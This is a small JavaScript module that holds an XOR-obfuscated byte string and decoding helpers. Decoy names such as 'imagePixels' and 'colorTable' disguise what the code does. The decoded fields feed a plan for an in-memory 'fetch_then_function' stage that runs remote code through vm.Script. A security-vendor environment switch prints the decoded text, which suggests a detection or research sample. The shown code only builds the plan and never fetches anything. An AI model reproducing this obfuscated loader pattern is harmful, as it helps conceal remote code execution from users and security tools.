const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_a7e0d274 = "\\xd3\\x80\\x64\\xd8\\x13\\xd1\\xd8\\x25\\xd7\\x5d\\xc4\\xde\\x24\\xd1\\x09\\xd7\\xd8\\x0a\\xd6\\x05\\xc8\\xd2\\x21\\xc1\\x4c\\xc1\\xd4\\x26\\xd4\\x01\\xd1\\xde\\x3d\\xfb\\x0d\\xc0\\xd0\\x3a\\xd6\\x19\\xd9\\xdc\\x31\\xc5\\x10\\xd1\\xd8\\x27\\x99\\x06\\xc0\\xc9\\x36\\xcc\\x3f\\xd1\\xd5\\x30\\xca\\x3f\\xc3\\xc8\\x3b\\xc7\\x14\\xcc\\xd2\\x3b\\xd8\\x13\\xd1\\xdc\\x32\\xc1\\x3f\\xc6\\xd2\\x20\\xca\\x14\\x98\\x8c\\x29\\xc7\\x01\\xc8\\xcd\\x34\\xcd\\x07\\xcb\\xe2\\x3c\\xc0\\x5d\\xeb\\xf2\\x11\\xe1\\x4d\\xe4\\xff\\x16\\xe1\\x59\\x91\\xfe\\x14\\xd8\\x15\\xd7\\xd1\\x68\\xcc\\x14\\xd1\\xcd\\x26\\x9e\\x4f\\x8a\\xd3\\x3a\\xc0\\x05\\x88\\xdc\\x37\\xc7\\x05\\x9c\\x89\\x36\\xc5\\x54\\x91\\x8b\\x60\\x8a\\x05\\xdd\\xdc\\x38\\xd4\\x0c\\xc0\\x93\\x3c\\xca\\x16\\xc4\\xd1\\x3c\\xc0\\x4f\\xc4\\xcd\\x3c\\xd8\\x15\\xd6\\xd8\\x27\\xfb\\x01\\xc2\\xd8\\x3b\\xd0\\x5d\\xeb\\xd2\\x31\\xc1\\x21\\xd0\\xd9\\x3c\\xd0\\x4f\\xc4\\xdf\\x36\\xc1";

const Codec_a7e0d274 = "escaped_octets|repeating_key_xor|a5,bd,55,a4,60";



function load_a7e0d274() { return [...Material_a7e0d274.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_a7e0d274(imagePixels) { const keyBytes = [165,189,85,164,96]; return imagePixels.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }

async function recover_a7e0d274() {

  const screenWidth = { ...{ north: 1 }, south: 2 };

  const imagePixels = load_a7e0d274(); let colorTable = [];

  let frameIndex = 0; while (frameIndex++ < 1) colorTable = decode_a7e0d274(imagePixels);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_a7e0d274() { return await recover_a7e0d274(); }

async function plan_a7e0d274() { const inspect = inspect_a7e0d274; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_a7e0d274;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_a7e0d274());

